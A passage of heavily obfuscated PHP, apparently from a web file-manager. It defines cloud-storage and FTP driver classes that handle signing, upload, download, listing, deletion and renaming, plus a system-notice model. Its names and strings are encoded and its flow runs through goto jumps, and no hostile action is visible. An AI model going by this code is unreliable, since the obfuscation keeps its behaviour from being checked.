($ü­ÀÑ‘¦) { return $ü­ÀÑ‘¦; } $ü­ÀÑ‘¦ = Mcrypt::encode($íµÀ°ÌÇ, $œŒÑææŠ[1641]); Cache::set($Ñ±û“Ç, $ü­ÀÑ‘¦, 3600 * 24 * 60); return $ü­ÀÑ‘¦; } private function requestQuery($Œ‡õ³³ = '', $éÌ×ìÙÔ = false) { if (!$Œ‡õ³³ || !is_array($Œ‡õ³³)) { return $Œ‡õ³³; } foreach ($Œ‡õ³³ as $—êëÁ©¬ => $£İìÅúß) { if (is_array($£İìÅúß)) { $Œ‡õ³³[$—êëÁ©¬] = json_encode($£İìÅúß); } } return $éÌ×ìÙÔ ? $_SERVER[œ—üé‹ê][284] . http_build_query($Œ‡õ³³) : $Œ‡õ³³; } private function requestSend($ èÅ˜Äî, $ªÓ“ç÷) { $İÜ…ş Ì =& $_SERVER[œ—üé‹ê]; $ÒÄâÉµ = $this->requestMakeUrl($ èÅ˜Äî); if (!$ÒÄâÉµ) { return !1; } $Âš§¢ = url_request($ÒÄâÉµ, $İÜ…ş Ì[288], $this->requestQuery($ªÓ“ç÷), !1, !1, !0); $üŞÓÉ = $Âš§¢[$İÜ…ş Ì[1388]]; if (!is_array($üŞÓÉ) || !$üŞÓÉ || !$üŞÓÉ[$İÜ…ş Ì[1398]] || intval($üŞÓÉ[$İÜ…ş Ì[1398]]) > 500) { $¶—£ = is_array($üŞÓÉ) ? $üŞÓÉ[$İÜ…ş Ì[1388]] : $üŞÓÉ . $İÜ…ş Ì[12]; if (!$Âš§¢[$İÜ…ş Ì[859]]) { $¶—£ .= $İÜ…ş Ì[1642] . $Âš§¢[$İÜ…ş Ì[1398]] . $İÜ…ş Ì[175]; } IO::errorTips($¶—£, !1); return !1; } return $üŞÓÉ; } } goto B§­†­ŠÖ; B§­†­ŠÖ: class PathDriverEDS extends PathDriverBaseS3 { public function __construct($ÇßÌ°è) { parent::__construct($ÇßÌ°è); $this->setSignVersion($_SERVER[œ—üé‹ê][247]); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($´ö—Òç) { parent::__construct($´ö—Òç); $this->setSignVersion($_SERVER[œ—üé‹ê][247]); } public function uploadFormData($Üšúô×¢, $¿ûÊå¿‰ = 3600) { $¡ÖŸåÔ =& $_SERVER[œ—üé‹ê]; $°Ãí§ˆş = $¡ÖŸåÔ[229]; $ØÍ•€®Ñ = $¡ÖŸåÔ[257]; $ÑÇ Äì = $¡ÖŸåÔ[62]; $®˜öù’× = gmdate($¡ÖŸåÔ[258]); $éÁì¿¸ = gmdate($¡ÖŸåÔ[259]); $ÅóÑŞ›™ = $¡ÖŸåÔ[260]; $øÈˆ˜À‚ = $¿ûÊå¿‰ . $¡ÖŸåÔ[12]; $àş×‘ÕÎ = $¡ÖŸåÔ[261]; $¢Ø§Ñª† = array($this->accessKey, $éÁì¿¸, $this->region, $ÑÇ Äì, $ÅóÑŞ›™); $”„ŒÒàÈ = implode($¡ÖŸåÔ[8], $¢Ø§Ñª†); $é ªı© = array($¡ÖŸåÔ[262] => gmdate($¡ÖŸåÔ[1521], strtotime($¡ÖŸåÔ[264])), $¡ÖŸåÔ[265] => array(array($¡ÖŸåÔ[266] => $this->bucket), array($¡ÖŸåÔ[306] => $°Ãí§ˆş), array($¡ÖŸåÔ[267], $¡ÖŸåÔ[268], $¡ÖŸåÔ[12]), array($¡ÖŸåÔ[267], $¡ÖŸåÔ[269], $¡ÖŸåÔ[12]), array($¡ÖŸåÔ[267], $¡ÖŸåÔ[307], $¡ÖŸåÔ[12]), array($¡ÖŸåÔ[270] => $àş×‘ÕÎ), array($¡ÖŸåÔ[271] => $”„ŒÒàÈ), array($¡ÖŸåÔ[272] => $ØÍ•€®Ñ), array($¡ÖŸåÔ[273] => $®˜öù’×), array($¡ÖŸåÔ[274] => $øÈˆ˜À‚))); $âèøŞ˜² = base64_encode(json_encode($é ªı©)); $«Ô—óá = hash_hmac($¡ÖŸåÔ[275], $éÁì¿¸, $¡ÖŸåÔ[276] . $this->secret, !0); $º£ñ”´ = hash_hmac($¡ÖŸåÔ[275], $this->region, $«Ô—óá, !0); $¨¶ß‡“§ = hash_hmac($¡ÖŸåÔ[275], $ÑÇ Äì, $º£ñ”´, !0); $ú›©ÇâÊ = hash_hmac($¡ÖŸåÔ[275], $ÅóÑŞ›™, $¨¶ß‡“§, !0); $İÆéĞ¯ì = hash_hmac($¡ÖŸåÔ[275], $âèøŞ˜², $ú›©ÇâÊ); $…·ª¹„é = array($¡ÖŸåÔ[246] => $¡ÖŸåÔ[12], $¡ÖŸåÔ[294] => $¡ÖŸåÔ[12], $¡ÖŸåÔ[306] => $°Ãí§ˆş, $¡ÖŸåÔ[270] => $àş×‘ÕÎ, $¡ÖŸåÔ[277] => $âèøŞ˜², $¡ÖŸåÔ[308] => $”„ŒÒàÈ, $¡ÖŸåÔ[309] => $ØÍ•€®Ñ, $¡ÖŸåÔ[310] => $®˜öù’×, $¡ÖŸåÔ[311] => $øÈˆ˜À‚, $¡ÖŸåÔ[312] => $İÆéĞ¯ì, $¡ÖŸåÔ[206] => $this->getHost()); return $…·ª¹„é; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; public $config = array(); public function __construct($×«”èÂë) { parent::__construct(); if (count($×«”èÂë) > 0) { $this->_init($×«”èÂë); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($¿ÊÕµ¢º) { $£Ú×áæÜ =& $_SERVER[œ—üé‹ê]; global $config; $this->appCharset = $config[$£Ú×áæÜ[1643]]; $this->systemCharset = $config[$£Ú×áæÜ[1644]]; if (isset($¿ÊÕµ¢º[$£Ú×áæÜ[1645]]) && $¿ÊÕµ¢º[$£Ú×áæÜ[1645]]) { $this->systemCharset = $¿ÊÕµ¢º[$£Ú×áæÜ[1645]]; } } public function iconvApp($ìú¢§¾Ö) { return $this->iconvTo($ìú¢§¾Ö, $this->systemCharset, $this->appCharset); } public function iconvSystem($¢òà™²‡) { return $this->iconvTo($¢òà™²‡, $this->appCharset, $this->systemCharset); } public function getPathOuter($ÀÂûœúà) { $ÕÏÑò´ë =& $_SERVER[œ—üé‹ê]; $òŞ’Ûö‡ = $this->iconvApp($this->pathBase); $ÀÂûœúà = $this->iconvApp($ÀÂûœúà); if (substr($òŞ’Ûö‡, 0, 2) == $ÕÏÑò´ë[1519]) { $òŞ’Ûö‡ = BASIC_PATH . substr($òŞ’Ûö‡, 2); } if (substr($ÀÂûœúà, 0, 2) == $ÕÏÑò´ë[1519]) { $ÀÂûœúà = BASIC_PATH . substr($ÀÂûœúà, 2); } $òŞ’Ûö‡ = KodIO::clear($òŞ’Ûö‡); $ÀÂûœúà = KodIO::clear($ÀÂûœúà); $ÀÂûœúà = substr($ÀÂûœúà, strlen($òŞ’Ûö‡)); if (empty($this->pathDriver)) { return $ÀÂûœúà; } return $this->pathDriver . $ÕÏÑò´ë[8] . ltrim($ÀÂûœúà, $ÕÏÑò´ë[8]); } private function _init($»çÚñ“œ = array()) { $Í‘ş¹úÖ =& $_SERVER[œ—üé‹ê]; if (!function_exists($Í‘ş¹úÖ[1646])) { throw new Exception(LNG($Í‘ş¹úÖ[1647])); } $this->config = $»çÚñ“œ; $this->charsetReset($»çÚñ“œ); foreach ($»çÚñ“œ as $¼¡Ø» => $·“×¼ƒ”) { if (isset($this->{$¼¡Ø»})) { $this->{$¼¡Ø»} = $·“×¼ƒ”; } } return $this->_login($»çÚñ“œ); } private function _login($Íìè¯‘¯) { $€ö®÷¦˜ =& $_SERVER[œ—üé‹ê]; static $ŒÍ¤ğÌ = array(); $¢¿ÜÎÉş = md5(json_encode($Íìè¯‘¯)); if (isset($ŒÍ¤ğÌ[$¢¿ÜÎÉş])) { foreach ($ŒÍ¤ğÌ[$¢¿ÜÎÉş] as $¨º‰ƒÕ => $Û¯—Ï˜) { $this->{$¨º‰ƒÕ} = $Û¯—Ï˜; } return !0; } $¦±­¡İÅ = parse_url(trim($this->server, $€ö®÷¦˜[8])); $this->host = $¦±­¡İÅ[$€ö®÷¦˜[206]]; $Ğñúğö = isset($¦±­¡İÅ[$€ö®÷¦˜[205]]) && $¦±­¡İÅ[$€ö®÷¦˜[205]] == $€ö®÷¦˜[1648] ? !0 : !1; $this->scheme = $Ğñúğö ? $€ö®÷¦˜[1649] : $€ö®÷¦˜[1650]; $this->port = isset($¦±­¡İÅ[$€ö®÷¦˜[207]]) ? $¦±­¡İÅ[$€ö®÷¦˜[207]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($€ö®÷¦˜[1651]) . $this->host . $€ö®÷¦˜[4] . $this->port, !0); return !1; } $Ë„‰…¢— = @ftp_login($this->connect, $this->username, $this->userpass); if (!$Ë„‰…¢—) { $this->writeLog(LNG($€ö®÷¦˜[1652]) . $this->username, !0); return !1; } $this->ftpPath = @ftp_pwd($this->connect); @ftp_chdir($this->connect, $€ö®÷¦˜[8]); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $İ¡¦‡¶ = $this->pasv == $€ö®÷¦˜[91] ? !0 : !1; @ftp_pasv($this->connect, $İ¡¦‡¶); $ŒÍ¤ğÌ[$¢¿ÜÎÉş] = array($€ö®÷¦˜[1653] => $this->connect, $€ö®÷¦˜[206] => $this->host, $€ö®÷¦˜[205] => $this->scheme, $€ö®÷¦˜[207] => $this->port); return $Ë„‰…¢—; } private function _isconn($÷Ÿëˆä” = true) { if (is_resource($this->connect)) { return !0; } if (!$÷Ÿëˆä”) { return !1; } return $this->_login($this->config); } public function mkfile($¨ÈéÊó­, $œéöÌø = '', $›™œÃ½ï = REPEAT_RENAME) { if ($this->setContent($¨ÈéÊó­, $œéöÌø)) { return $this->getPathOuter($¨ÈéÊó­); } $this->writeLog(LNG($_SERVER[œ—üé‹ê][1654]), !0); return !1; } public function mkdir($Ã¢Ùü¼Ä, $Æ¸ì·é = REPEAT_SKIP) { $’ˆ½°¡× =& $_SERVER[œ—üé‹ê]; if (!$Ã¢Ùü¼Ä || $Ã¢Ùü¼Ä == $’ˆ½°¡×[8]) { return !0; } if (!$this->_isconn()) { return !1; } $Ã¢Ùü¼Ä = $this->iconvSystem($Ã¢Ùü¼Ä); if ($this->_isFolder($Ã¢Ùü¼Ä) || @ftp_mkdir($this->connect, $Ã¢Ùü¼Ä)) { return $this->getPathOuter($Ã¢Ùü¼Ä); } if (!$this->mkdir($this->pathFather($Ã¢Ùü¼Ä))) { return !1; } if ($Ã¢Ùü¼Ä = @ftp_mkdir($this->connect, $Ã¢Ùü¼Ä)) { return $this->getPathOuter($Ã¢Ùü¼Ä); } $Ñ»úú®Û = __FUNCTION__ . $’ˆ½°¡×[1655]; $this->writeLog($Ñ»úú®Û, !0); return !1; } public function copyFile($ïüàŸ¾, $ŸİâÂ¼¾) { if (!$this->_isconn()) { return !1; } $Ø•œœ = $this->pathThis($this->iconvSystem($ïüàŸ¾)); $‚®„é· = $this->tempFile($Ø•œœ); $ÕÌŠÚë = $this->iconvApp($‚®„é·); $this->download($ïüàŸ¾, $ÕÌŠÚë); $üšÜÒÂ¾ = $this->upload($ŸİâÂ¼¾, $ÕÌŠÚë); $this->tempFileRemve($‚®„é·); return $üšÜÒÂ¾; } public function moveFile($¦Şïß×ô, $ÏæÕ³âö) { if (!$this->_isconn()) { return !1; } $¦Şïß×ô = $this->iconvSystem($¦Şïß×ô); $ÏæÕ³âö = $this->iconvSystem($ÏæÕ³âö); $ÅÖíõ¥‚ = @ftp_rename($this->connect, $¦Şïß×ô, $ÏæÕ³âö); if (!$ÅÖíõ¥‚) { $this->writeLog(__FUNCTION__ . $_SERVER[œ—üé‹ê][1655], !0); return !1; } return $this->getPathOuter($ÏæÕ³âö); } public function delFile($—’‰›Ş) { if (!$this->_isconn()) { return !1; } $—’‰›Ş = $this->iconvSystem($—’‰›Ş); $½™üäıû = @ftp_delete($this->connect, $—’‰›Ş); if (!$½™üäıû) { $this->writeLog(__FUNCTION__ . $_SERVER[œ—üé‹ê][1655], !0); } return $½™üäıû; } public function delFolder($’ùŸŠ¦…) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $³Ì–Œ¯ì = $ãƒøŒ¨í = array(); $this->fileList($’ùŸŠ¦…, $³Ì–Œ¯ì, $ãƒøŒ¨í, !0); $this->listItemCache = !0; foreach ($ãƒøŒ¨í as $¦©·äø—) { $ÂİœÁ = $this->iconvSystem($¦©·äø—[$_SERVER[œ—üé‹ê][32]]); $‰œ¦Ï¿ = @ftp_delete($this->connect, $ÂİœÁ); if (!$‰œ¦Ï¿) { return !1; } } foreach ($³Ì–Œ¯ì as $ÂİœÁ) { $ÂİœÁ = $this->iconvSystem($ÂİœÁ); $‰œ¦Ï¿ = @ftp_rmdir($this->connect, $ÂİœÁ); if (!$‰œ¦Ï¿) { return !1; } } $’ùŸŠ¦… = $this->iconvSystem($’ùŸŠ¦…); return @ftp_rmdir($this->connect, $’ùŸŠ¦…); } public function rename($Ï“ë›æÙ, $… şî) { $òç»µ =& $_SERVER[œ—üé‹ê]; if (!$this->_isconn()) { return !1; } $İÌà›«˜ = $this->fileNameAuto($this->pathFather($Ï“ë›æÙ), $… şî); $İÌà›«˜ = $this->iconvSystem($İÌà›«˜); $Ï“ë›æÙ = $this->iconvSystem($Ï“ë›æÙ); $õõ›µÀ = $this->pathFather($Ï“ë›æÙ); $·¹ıáÄà = rtrim($õõ›µÀ, $òç»µ[8]) . $òç»µ[8] . $İÌà›«˜; $ªˆ×Êúû = @ftp_rename($this->connect, $Ï“ë›æÙ, $·¹ıáÄà); if (!$ªˆ×Êúû) { $this->writeLog(__FUNCTION__ . $òç»µ[1655], !0); return !1; } $·¹ıáÄà = $this->iconvApp($·¹ıáÄà); return $this->getPathOuter($·¹ıáÄà); } private function folderInfo($ãŠåÈ„ì, $Í÷©Äœç = false) { $¹Ñ‘£òã =& $_SERVER[œ—üé‹ê]; $®ÙŸè­ = array($¹Ñ‘£òã[32] => $this->pathThis($ãŠåÈ„ì), $¹Ñ‘£òã[87] => $this->getPathOuter($¹Ñ‘£òã[8] . $ãŠåÈ„ì), $¹Ñ‘£òã[33] => $¹Ñ‘£òã[78]); if ($Í÷©Äœç) { return $®ÙŸè­; } $®ÙŸè­[$¹Ñ‘£òã[231]] = $®ÙŸè­[$¹Ñ‘£òã[88]] = 0; $®ÙŸè­[$¹Ñ‘£òã[232]] = $®ÙŸè­[$¹Ñ‘£òã[233]] = !0; return $®ÙŸè­; } private function fileInfo($Ìç¡„, $¹â˜Åèœ = false, $ï¶Ş³× = array()) { $Âğœ« =& $_SERVER[œ—üé‹ê]; $ŸÄõÒ¦â = array($Âğœ«[32] => $this->pathThis($Ìç¡„), $Âğœ«[87] => $this->getPathOuter($Âğœ«[8] . $Ìç¡„), $Âğœ«[33] => $Âğœ«[230], $Âğœ«[79] => isset($ï¶Ş³×[$Âğœ«[79]]) ? $ï¶Ş³×[$Âğœ«[79]] : 0, $Âğœ«[166] => $this->ext($Ìç¡„)); if ($¹â˜Åèœ) { return $ŸÄõÒ¦â; } $ŸÄõÒ¦â[$Âğœ«[231]] = $ŸÄõÒ¦â[$Âğœ«[88]] = 0; $ŸÄõÒ¦â[$Âğœ«[232]] = $ŸÄõÒ¦â[$Âğœ«[233]] = !0; $‡øÔÓÚÛ = $this->iconvSystem($Ìç¡„); $ŸÄõÒ¦â[$Âğœ«[88]] = @ftp_mdtm($this->connect, $‡øÔÓÚÛ); if (empty($ï¶Ş³×)) { $ï¶Ş³× = $this->objectMeta($Ìç¡„); if (!$ï¶Ş³×) { return $ŸÄõÒ¦â; } } $ŸÄõÒ¦â[$Âğœ«[79]] = $ï¶Ş³×[$Âğœ«[79]]; return $ŸÄõÒ¦â; } public function size($·ŞŠ ½ü) { $ì÷Ä“‡Ô = $this->objectMeta($·ŞŠ ½ü); return $ì÷Ä“‡Ô ? $ì÷Ä“‡Ô[$_SERVER[œ—üé‹ê][79]] : 0; } public function info($›ª¹ı¿Ã) { if ($this->isFile($›ª¹ı¿Ã)) { return $this->fileInfo($›ª¹ı¿Ã, 0); } else { if ($this->isFolder($›ª¹ı¿Ã)) { return $this->folderInfo($›ª¹ı¿Ã); } } return !1; } private function fileList($ô·®††¤, &$²Ó…€à÷, &$ìÚçò«†, $˜³ú¤£× = false) { $÷ŸáÁÏÁ =& $_SERVER[œ—üé‹ê]; $ô·®††¤ = $this->iconvSystem($ô·®††¤); if (!$this->isFolder($ô·®††¤)) { return !1; } $ô·®††¤ = rtrim($ô·®††¤, $÷ŸáÁÏÁ[8]) . $÷ŸáÁÏÁ[8]; check_abort(); $µùÇ·´² = @ftp_rawlist($this->connect, $ô·®††¤); if (!$µùÇ·´²) { $µùÇ·´² = array(); } $ôƒùá³ = array($÷ŸáÁÏÁ[10] => 1, $÷ŸáÁÏÁ[1464] => 1); foreach ($µùÇ·´² as $‰‰Ã¸£æ) { $½©ó‚‹“ = $this->_listItem($‰‰Ã¸£æ); if ($½©ó‚‹“[0] == $÷ŸáÁÏÁ[868]) { continue; } $Ï¯À‚¾µ = $½©ó‚‹“[8]; if (empty($Ï¯À‚¾µ) && $Ï¯À‚¾µ !== $÷ŸáÁÏÁ[228] || isset($ôƒùá³[$Ï¯À‚¾µ])) { continue; } $Ï¯À‚¾µ = $this->iconvApp($ô·®††¤ . ltrim($Ï¯À‚¾µ, $÷ŸáÁÏÁ[8])); $ŠÁî‹Úİ = array($÷ŸáÁÏÁ[32] => $Ï¯À‚¾µ, $÷ŸáÁÏÁ[33] => $÷ŸáÁÏÁ[230], $÷ŸáÁÏÁ[79] => $½©ó‚‹“[4]); if (substr($‰‰Ã¸£æ, 0, 1) == $÷ŸáÁÏÁ[1656]) { $ŠÁî‹Úİ[$÷ŸáÁÏÁ[33]] = $÷ŸáÁÏÁ[78]; $ŠÁî‹Úİ[$÷ŸáÁÏÁ[79]] = 0; } $¯ÚÓ™µ¸ = $ŠÁî‹Úİ[$÷ŸáÁÏÁ[33]] == $÷ŸáÁÏÁ[78] ? !0 : !1; $this->cacheMethodInfoSet($Ï¯À‚¾µ, $¯ÚÓ™µ¸, $ŠÁî‹Úİ); if ($¯ÚÓ™µ¸) { $²Ó…€à÷[] = $Ï¯À‚¾µ; if ($˜³ú¤£×) { $this->fileList($Ï¯À‚¾µ, $²Ó…€à÷, $ìÚçò«†, $˜³ú¤£×); } continue; } $ìÚçò«†[] = $ŠÁî‹Úİ; } $this->cacheMethodInfoSet($ô·®††¤, !0); } private function _listItem($ğ–Ô™‡×) { if (empty($ğ–Ô™‡×)) { return array(); } $ÕËÊÈì° = preg_split($_SERVER[œ—üé‹ê][1657], $ğ–Ô™‡×); if (count($ÕËÊÈì°) <= 9) { return $ÕËÊÈì°; } $ÕËÊÈì°[8] = trim(substr($ğ–Ô™‡×, strpos($ğ–Ô™‡×, $ÕËÊÈì°[7]) + strlen($ÕËÊÈì°[7]))); return array_splice($ÕËÊÈì°, 0, 9); } public function listPath($ËËÀäô, $Ä¹ÎİÌÛ = false) { $îñãÀˆ˜ =& $_SERVER[œ—üé‹ê]; if (!$this->_isconn()) { return !1; } $ìßŸÄ’æ = $—§’šÇ = array(); $this->fileList($ËËÀäô, $ìßŸÄ’æ, $—§’šÇ); foreach ($ìßŸÄ’æ as $¸Êæ¤âÍ => $ù„‡øó) { $ìßŸÄ’æ[$¸Êæ¤âÍ] = $this->folderInfo($ù„‡øó, $Ä¹ÎİÌÛ); } foreach ($—§’šÇ as $¸Êæ¤âÍ => $ù„‡øó) { $—§’šÇ[$¸Êæ¤âÍ] = $this->fileInfo($ù„‡øó[$îñãÀˆ˜[32]], $Ä¹ÎİÌÛ, $ù„‡øó); } return array($îñãÀˆ˜[85] => $ìßŸÄ’æ, $îñãÀˆ˜[86] => $—§’šÇ); } public function has($§ÒäÙ, $ÕÒçù¦‹ = false, $Ã”·ÀöĞ = true) { $ÔÅô›¾× =& $_SERVER[œ—üé‹ê]; $…ÎåÎí = $•ñŸÏü¥ = array(); $­¼€ƒ² = $ÕÒçù¦‹ ? !0 : !1; $this->fileList($§ÒäÙ, $…ÎåÎí, $•ñŸÏü¥, $­¼€ƒ²); if ($ÕÒçù¦‹) { return array($ÔÅô›¾×[239] => count($•ñŸÏü¥), $ÔÅô›¾×[240] => count($…ÎåÎí)); } if ($Ã”·ÀöĞ) { if (count($•ñŸÏü¥)) { return !0; } } else { if (count($…ÎåÎí)) { return !0; } } return !1; } public function listAll($î²†Û“á) { $‰ß¥éÂÎ =& $_SERVER[œ—üé‹ê]; if (!$this->_isconn()) { return !1; } $§¾ç§ù = $©±«Æ‰Ó = array(); $this->fileList($î²†Û“á, $§¾ç§ù, $©±«Æ‰Ó, !0); $ÓªŒÏßº = array_to_keyvalue($©±«Æ‰Ó, $‰ß¥éÂÎ[32]); foreach ($§¾ç§ù as $ÑŞí€õ¿) { if (is_string($ÑŞí€õ¿)) { $ÓªŒÏßº[$ÑŞí€õ¿] = array($‰ß¥éÂÎ[79] => 0); } } return $this->listAllFiles($î²†Û“á, $ÓªŒÏßº); } public function getContent($Ò›¾‰ÉÎ) { if (!$this->_isconn()) { return !1; } $Ò›¾‰ÉÎ = $this->iconvSystem($Ò›¾‰ÉÎ); return $this->fileSubstr($Ò›¾‰ÉÎ); } public function setContent($•ÄÅéØä, $àË³“ = '') { if (!$this->_isconn()) { return !1; } $Í©ïš÷ğ = $this->pathThis($this->iconvSystem($•ÄÅéØä)); $ÙâÎÒ¸ş = $this->tempFile($Í©ïš÷ğ); file_put_contents($ÙâÎÒ¸ş, $àË³“); $æÆğë… = $this->upload($•ÄÅéØä, $this->iconvApp($ÙâÎÒ¸ş)); $this->tempFileRemve($ÙâÎÒ¸ş); return $æÆğë…; } public function fileSubstr($µ‰®Î«ö, $¦©œ…ÉÓ = 0, $Ü”©™¾­ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($µ‰®Î«ö, $¦©œ…ÉÓ, $Ü”©™¾­); } private function ftpRequest($ıîëä¨, $€›§ÓĞ¤ = 0, $Ñ±ÖŒ¡Ä = false) { $üæ– ¡¾ =& $_SERVER[œ—üé‹ê]; $ıîëä¨ = $üæ– ¡¾[8] . ltrim(str_ltrim($ıîëä¨, $this->ftpPath), $üæ– ¡¾[8]); $ıîëä¨ = $this->iconvSystem($ıîëä¨); $ş°œç× = $this->scheme . $this->host . $üæ– ¡¾[4] . $this->port; $™Õ·ñÓ¹ = curl_init(); curl_setopt($™Õ·ñÓ¹, CURLOPT_URL, $ş°œç× . $this->pathEncode($ıîëä¨)); curl_setopt($™Õ·ñÓ¹, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($Ñ±ÖŒ¡Ä) { $éÇºÜƒ¬ = $€›§ÓĞ¤ + $Ñ±ÖŒ¡Ä - 1; curl_setopt($™Õ·ñÓ¹, CURLOPT_RANGE, "{$€›§ÓĞ¤}\x2d{$éÇºÜƒ¬}"); } curl_setopt($™Õ·ñÓ¹, CURLOPT_RETURNTRANSFER, 1); $ÅëŞé¼İ = curl_exec($™Õ·ñÓ¹); curl_close($™Õ·ñÓ¹); return $ÅëŞé¼İ; } public function upload($û÷å´§Ù, $¼Ï”Ğé×, $™½İ°ªÉ = false, $êŞÅç‡½ = REPEAT_REPLACE) { if (!$¼Ï”Ğé× || !@file_exists($¼Ï”Ğé×)) { return !1; } if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($û÷å´§Ù))) { return !1; } $û÷å´§Ù = $this->iconvSystem($û÷å´§Ù); $¼Ï”Ğé× = $this->iconvSystem($¼Ï”Ğé×); $¼õ¢ÈÉ˜ = ftp_nb_put($this->connect, $û÷å´§Ù, $¼Ï”Ğé×, FTP_BINARY); while ($¼õ¢ÈÉ˜ == FTP_MOREDATA) { $¼õ¢ÈÉ˜ = ftp_nb_continue($this->connect); } if ($¼õ¢ÈÉ˜ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[œ—üé‹ê][1655], !0); return !1; } return $this->getPathOuter($û÷å´§Ù); } public function download($®ş®Æôñ, $Ü»¬¥–¸ = '') { if (!$this->_isconn()) { return !1; } $íÓÚÃ‰å = $this->pathFather($Ü»¬¥–¸); if (!IO::mkdir($íÓÚÃ‰å)) { return !1; } $®ş®Æôñ = $this->iconvSystem($®ş®Æôñ); $Ü»¬¥–¸ = $this->iconvSystem($Ü»¬¥–¸); $‰—üƒ­÷ = ftp_nb_get($this->connect, $Ü»¬¥–¸, $®ş®Æôñ, FTP_BINARY); while ($‰—üƒ­÷ == FTP_MOREDATA) { $‰—üƒ­÷ = ftp_nb_continue($this->connect); } if ($‰—üƒ­÷ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[œ—üé‹ê][1655], !0); return !1; } return $this->iconvApp($Ü»¬¥–¸); } public function exist($ïÈéÔÍ€) { return $this->isFile($ïÈéÔÍ€) || $this->isFolder($ïÈéÔÍ€); } public function isFile($‹ò½İšË) { return !$this->isFolder($‹ò½İšË) && $this->objectMeta($‹ò½İšË); } public function isFolder($”’‡É›È) { return $this->cacheMethod($_SERVER[œ—üé‹ê][177], $”’‡É›È); } protected function objectMeta($÷á¨•×„) { return $this->cacheMethod($_SERVER[œ—üé‹ê][179], $÷á¨•×„); } protected function _objectMeta($èÙĞğ’) { $åç®¥ƒğ =& $_SERVER[œ—üé‹ê]; if ($èÙĞğ’ == $åç®¥ƒğ[12] || $èÙĞğ’ == $åç®¥ƒğ[8]) { return array(); } if (!$this->_isconn()) { return !1; } $èÙĞğ’ = $this->iconvSystem($èÙĞğ’); $Ğ¢º¥µ = array($åç®¥ƒğ[32] => $this->iconvApp($èÙĞğ’), $åç®¥ƒğ[33] => $åç®¥ƒğ[230], $åç®¥ƒğ[79] => 0); $ÄĞë‚µ„ = @ftp_size($this->connect, $èÙĞğ’); if ($ÄĞë‚µ„ != -1) { $Ğ¢º¥µ[$åç®¥ƒğ[79]] = $ÄĞë‚µ„; } else { $ı»…÷ë÷ = @ftp_chdir($this->connect, $èÙĞğ’); if (!$ı»…÷ë÷) { return !1; } @ftp_chdir($this->connect, $åç®¥ƒğ[8]); $Ğ¢º¥µ[$åç®¥ƒğ[33]] = $åç®¥ƒğ[78]; } return $Ğ¢º¥µ; } protected function _isFolder($„½ØŞğ ) { $œ÷ÃõÏ» =& $_SERVER[œ—üé‹ê]; if ($„½ØŞğ  == $œ÷ÃõÏ»[12] || $„½ØŞğ  == $œ÷ÃõÏ»[8]) { return !0; } $Ô¯Ò›É› = $this->_objectMeta($„½ØŞğ ); return isset($Ô¯Ò›É›[$œ÷ÃõÏ»[33]]) && $Ô¯Ò›É›[$œ÷ÃõÏ»[33]] == $œ÷ÃõÏ»[78] ? !0 : !1; } } goto dó—Óˆİø; aâ¤•”Åã£: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\155\56\156\x6f\164\151\x63\x65\x4c\151\x73\164"; public $field = array("\x6e\141\x6d\x65", "\143\157\156\x74\x65\156\164", "\141\x75\164\x68", "\x6d\x6f\x64\145", "\x74\151\155\x65", "\x74\x79\x70\x65", "\154\145\166\x65\154", "\x65\x6e\x61\142\x6c\x65", "\x73\x6f\162\x74"); public function listData($â»™‹è = false, $ùåÎèà = "\x73\x6f\162\x74", $ıûÁ¦Ş˜ = false) { return parent::listData($â»™‹è, $ùåÎèà, $ıûÁ¦Ş˜); } public function add($ÜİÕ´è) { $ŞŞæµä‚ =& $_SERVER[œ—üé‹ê]; $Œ†§Á‹ = time(); if ($ÜİÕ´è[$ŞŞæµä‚[16]] == $ŞŞæµä‚[2651]) { $Œ†§Á‹ = strtotime($ÜİÕ´è[$ŞŞæµä‚[204]]); } $ÜİÕ´è[$ŞŞæµä‚[204]] = $Œ†§Á‹; return parent::insert($ÜİÕ´è); } public function update($©¤®©ö, $ë÷Ü¤£«) { $æè’îÂ =& $_SERVER[œ—üé‹ê]; $êÄÕ˜Äú = $this->listData($©¤®©ö); if (!$êÄÕ˜Äú) { return !1; } $æ»Óœ”İ = time(); if ($ë÷Ü¤£«[$æè’îÂ[16]] == $æè’îÂ[2651]) { $æ»Óœ”İ = strtotime($ë÷Ü¤£«[$æè’îÂ[204]]); } $ë÷Ü¤£«[$æè’îÂ[204]] = $æ»Óœ”İ; return parent::update($©¤®©ö, $ë÷Ü¤£«); } public function remove($Éç…Ï‡„) { $éõ¨×•› = $this->listData($Éç…Ï‡„); if (!$éõ¨×•› || $éõ¨×•›[$_SERVER[œ—üé‹ê][189]]) { return !1; } return parent::remove($Éç…Ï‡„); } public function sort($á¸Ğá‰à, $ıÏ©’ŒÒ) { return parent::update($á¸Ğá‰à, $ıÏ©’ŒÒ); } public function enable($ŸíîÑÄ, $ÙÎ‘‰®) { return parent::update($ŸíîÑÄ, array($_SERVER[œ—üé‹ê][2652] => $ÙÎ‘‰®)); } private function initUserOption() { $Ñ‚¹£Äå =& $_SERVER[œ—üé‹ê]; $this->optionType = $Ñ‚¹£Äå[2653]; $this->modelType = $Ñ‚¹£Äå[2654]; $this->field = array($Ñ‚¹£Äå[2655], $Ñ‚¹£Äå[32], $Ñ‚¹£Äå[204], $Ñ‚¹£Äå[33], $Ñ‚¹£Äå[2656], $Ñ‚¹£Äå[859], $Ñ‚¹£Äå[226]); } public function userNoticeGet($çìµìÂÈ = false) { $this->initUserOption(); return parent::listData($çìµìÂÈ, $_SERVER[œ—üé‹ê][487], !0); } public function userNoticeAdd($‹‹Ş¨¨Æ) { $¿­µ¢á =& $_SERVER[œ—üé‹ê]; $this->initUserOption(); 